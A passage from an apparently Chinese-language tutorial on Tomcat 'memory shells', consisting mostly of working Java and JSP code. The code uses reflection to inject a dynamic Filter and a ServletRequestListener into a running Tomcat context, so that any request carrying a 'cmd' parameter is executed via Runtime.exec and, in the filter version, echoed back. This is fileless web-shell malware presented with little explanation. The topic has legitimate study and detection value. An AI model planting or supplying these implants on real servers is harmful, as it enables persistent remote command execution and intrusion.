</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.core.ApplicationContext&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.core.StandardContext&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.core.ApplicationFilterConfig&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.lang.reflect.Constructor&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.InputStreamReader&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.BufferedReader&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.util.Map&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.lang.reflect.Field&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.Context&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.IOException&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=w>  </span><span class=n>ServletContext</span><span class=w> </span><span class=n>servletContext</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>request</span><span class=p>.</span><span class=na>getServletContext</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>f1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>servletContext</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;context&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>    </span><span class=n>f1</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>    </span><span class=n>ApplicationContext</span><span class=w> </span><span class=n>applicationContext</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>ApplicationContext</span><span class=p>)</span><span class=w> </span><span class=n>f1</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>servletContext</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>f2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>applicationContext</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;context&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w>    </span><span class=n>f2</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w>    </span><span class=n>StandardContext</span><span class=w> </span><span class=n>standardContext</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>StandardContext</span><span class=p>)</span><span class=w> </span><span class=n>f2</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>applicationContext</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>23</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>24</span><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>f3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>standardContext</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;filterConfigs&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>25</span><span class=cl><span class=w>    </span><span class=n>f3</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>26</span><span class=cl><span class=w>    </span><span class=n>Map</span><span class=w> </span><span class=n>filterConfigs</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Map</span><span class=p>)</span><span class=w> </span><span class=n>f3</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>standardContext</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>27</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>28</span><span class=cl><span class=w>    </span><span class=n>Filter</span><span class=w> </span><span class=n>filter</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Filter</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>29</span><span class=cl><span class=w>        </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln>30</span><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>init</span><span class=p>(</span><span class=n>FilterConfig</span><span class=w> </span><span class=n>filterConfig</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>ServletException</span><span class=w> </span><span class=p>{}</span><span class=w>
</span></span></span><span class=line><span class=ln>31</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>32</span><span class=cl><span class=w>        </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln>33</span><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>doFilter</span><span class=p>(</span><span class=n>ServletRequest</span><span class=w> </span><span class=n>servletRequest</span><span class=p>,</span><span class=w> </span><span class=n>ServletResponse</span><span class=w> </span><span class=n>servletResponse</span><span class=p>,</span><span class=w> </span><span class=n>FilterChain</span><span class=w> </span><span class=n>filterChain</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ServletException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>34</span><span class=cl><span class=w>            </span><span class=n>servletResponse</span><span class=p>.</span><span class=na>getWriter</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;&lt;br&gt;Hello Dynamic Filter 2&lt;br&gt;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>35</span><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>servletRequest</span><span class=p>.</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;cmd&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>36</span><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmd</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>37</span><span class=cl><span class=w>                </span><span class=n>servletResponse</span><span class=p>.</span><span class=na>setContentType</span><span class=p>(</span><span class=s>&#34;text/html&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>38</span><span class=cl><span class=w>                </span><span class=n>Process</span><span class=w> </span><span class=n>process</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>39</span><span class=cl><span class=w>                </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=ln>40</span><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>41</span><span class=cl><span class=w>                </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>42</span><span class=cl><span class=w>                    </span><span class=n>servletResponse</span><span class=p>.</span><span class=na>getWriter</span><span class=p>().</span><span class=na>println</span><span class=p>(</span><span class=n>line</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>43</span><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>44</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>45</span><span class=cl><span class=w>            </span><span class=n>filterChain</span><span class=p>.</span><span class=na>doFilter</span><span class=p>(</span><span class=n>servletRequest</span><span class=p>,</span><span class=w> </span><span class=n>servletResponse</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>46</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>47</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>48</span><span class=cl><span class=w>        </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln>49</span><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>destroy</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>50</span><span class=cl><span class=w>            </span><span class=n>Filter</span><span class=p>.</span><span class=na>super</span><span class=p>.</span><span class=na>destroy</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>51</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>52</span><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=ln>53</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>54</span><span class=cl><span class=w>    </span><span class=n>FilterDef</span><span class=w> </span><span class=n>filterDef</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FilterDef</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>55</span><span class=cl><span class=w>    </span><span class=n>filterDef</span><span class=p>.</span><span class=na>setFilterName</span><span class=p>(</span><span class=s>&#34;DynamicFilterShell2&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>56</span><span class=cl><span class=w>    </span><span class=n>filterDef</span><span class=p>.</span><span class=na>setFilterClass</span><span class=p>(</span><span class=n>filter</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getName</span><span class=p>());</span><span class=w> 
</span></span></span><span class=line><span class=ln>57</span><span class=cl><span class=w>    </span><span class=n>filterDef</span><span class=p>.</span><span class=na>setFilter</span><span class=p>(</span><span class=n>filter</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>58</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>59</span><span class=cl><span class=w>    </span><span class=n>FilterMap</span><span class=w> </span><span class=n>filterMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FilterMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>60</span><span class=cl><span class=w>    </span><span class=n>filterMap</span><span class=p>.</span><span class=na>setFilterName</span><span class=p>(</span><span class=n>filterDef</span><span class=p>.</span><span class=na>getFilterName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=ln>61</span><span class=cl><span class=w>    </span><span class=n>filterMap</span><span class=p>.</span><span class=na>setDispatcher</span><span class=p>(</span><span class=n>DispatcherType</span><span class=p>.</span><span class=na>REQUEST</span><span class=p>.</span><span class=na>name</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=ln>62</span><span class=cl><span class=w>    </span><span class=n>filterMap</span><span class=p>.</span><span class=na>addURLPattern</span><span class=p>(</span><span class=s>&#34;/*&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>63</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>64</span><span class=cl><span class=w>    </span><span class=n>standardContext</span><span class=p>.</span><span class=na>addFilterDef</span><span class=p>(</span><span class=n>filterDef</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>65</span><span class=cl><span class=w>    </span><span class=n>standardContext</span><span class=p>.</span><span class=na>addFilterMapBefore</span><span class=p>(</span><span class=n>filterMap</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>66</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>67</span><span class=cl><span class=w>    </span><span class=n>Constructor</span><span class=w> </span><span class=n>constructor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ApplicationFilterConfig</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredConstructor</span><span class=p>(</span><span class=n>Context</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>FilterDef</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>68</span><span class=cl><span class=w>    </span><span class=n>constructor</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>69</span><span class=cl><span class=w>    </span><span class=n>FilterConfig</span><span class=w> </span><span class=n>filterConfig</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>FilterConfig</span><span class=p>)</span><span class=w> </span><span class=n>constructor</span><span class=p>.</span><span class=na>newInstance</span><span class=p>(</span><span class=n>standardContext</span><span class=p>,</span><span class=w> </span><span class=n>filterDef</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>70</span><span class=cl><span class=w>    </span><span class=n>filterConfigs</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;DynamicFilterShell2&#34;</span><span class=p>,</span><span class=w> </span><span class=n>filterConfig</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>71</span><span class=cl><span class=w></span><span class=o>%&gt;</span><span class=w>
</span></span></span></code></pre></div><h3 id=13-listener>1.3 Listener</h3><h4 id=1-listener>1) Listener</h4><p><code>Listener</code>是一个实现了特定接口的 Java 程序，用于监听一个方法或者属性，当被监听的方法被调用或者属性改变时，就会自动执行某个方法。</p><h4 id=2-listener-内存马>2) Listener 内存马</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=c1>// 不能写入response</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=nd>@WebListener</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>ListenerShell</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>ServletRequestListener</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>requestInitialized</span><span class=p>(</span><span class=n>ServletRequestEvent</span><span class=w> </span><span class=n>sre</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w>        </span><span class=n>ServletRequestListener</span><span class=p>.</span><span class=na>super</span><span class=p>.</span><span class=na>requestInitialized</span><span class=p>(</span><span class=n>sre</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sre</span><span class=p>.</span><span class=na>getServletRequest</span><span class=p>().</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;cmd&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmd</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>                </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>                </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;ListenerShell&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>                </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>requestDestroyed</span><span class=p>(</span><span class=n>ServletRequestEvent</span><span class=w> </span><span class=n>sre</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w>        </span><span class=n>ServletRequestListener</span><span class=p>.</span><span class=na>super</span><span class=p>.</span><span class=na>requestDestroyed</span><span class=p>(</span><span class=n>sre</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=ln> 1</span><span class=cl><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.core.ApplicationContext&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 2</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;org.apache.catalina.core.StandardContext&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 3</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.lang.reflect.Constructor&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 4</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.lang.reflect.Field&#34;</span><span class=w> </span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 5</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.InputStreamReader&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 6</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.BufferedReader&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 7</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=nd>@page</span><span class=w> </span><span class=n>import</span><span class=o>=</span><span class=s>&#34;java.io.IOException&#34;</span><span class=o>%&gt;</span><span class=w>
</span></span></span><span class=line><span class=ln> 8</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln> 9</span><span class=cl><span class=w></span><span class=o>&lt;%</span><span class=w> 
</span></span></span><span class=line><span class=ln>10</span><span class=cl><span class=w>    </span><span class=n>Field</span><span class=w> </span><span class=n>f3</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>request</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;request&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>11</span><span class=cl><span class=w>    </span><span class=n>f3</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>12</span><span class=cl><span class=w>    </span><span class=n>Request</span><span class=w> </span><span class=n>req</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Request</span><span class=p>)</span><span class=w> </span><span class=n>f3</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>request</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>13</span><span class=cl><span class=w>    </span><span class=n>StandardContext</span><span class=w> </span><span class=n>standardContext</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>StandardContext</span><span class=p>)</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=na>getContext</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=ln>14</span><span class=cl><span class=w>
</span></span></span><span class=line><span class=ln>15</span><span class=cl><span class=w>    </span><span class=n>standardContext</span><span class=p>.</span><span class=na>addApplicationEventListener</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ServletRequestListener</span><span class=p>(){</span><span class=w>
</span></span></span><span class=line><span class=ln>16</span><span class=cl><span class=w>        </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln>17</span><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>requestInitialized</span><span class=p>(</span><span class=n>ServletRequestEvent</span><span class=w> </span><span class=n>sre</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>18</span><span class=cl><span class=w>            </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;DynamicListenerShell&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>19</span><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sre</span><span class=p>.</span><span class=na>getServletRequest</span><span class=p>().</span><span class=na>getParameter</span><span class=p>(</span><span class=s>&#34;cmd&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>20</span><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmd</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>21</span><span class=cl><span class=w>                </span><span class=k>try</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>22</span><span class=cl><span class=w>                    </span><span class=n>Process</span><span class=w> </span><span class=n>process</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>23</span><span class=cl><span class=w>                    </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=ln>24</span><span class=cl><span class=w>                    </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=ln>25</span><span class=cl><span class=w>                    </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=ln>26</span><span class=cl><span class=w>                        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>line</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=ln>27</span><span class=cl><span class=w>                    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>28</span><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>29</span><span class=cl><span class=w>                </span><span class=k>catch</span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>){}</span><span class=w>
</span></span></span><span class=line><span class=ln>30</span><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>31</span><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=ln>32</span><span class=cl><span class=w>        </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=ln>33</span><span class=cl><span class=w>        </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>requestDestroyed</span><span class=p>(</span><span class=n>ServletRequestEvent</span><span class=w> </span><span class=n>sre</span><span class=p>)</span><span class=w> </span><span class=p>{}</span><span class=w>
</span></span></span><span class=line><span class=ln>34</span><span class=cl><span class=w>    </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=ln>35</span><span class=cl><span class=w></span><span class=o>%&gt;</span><span class=w>
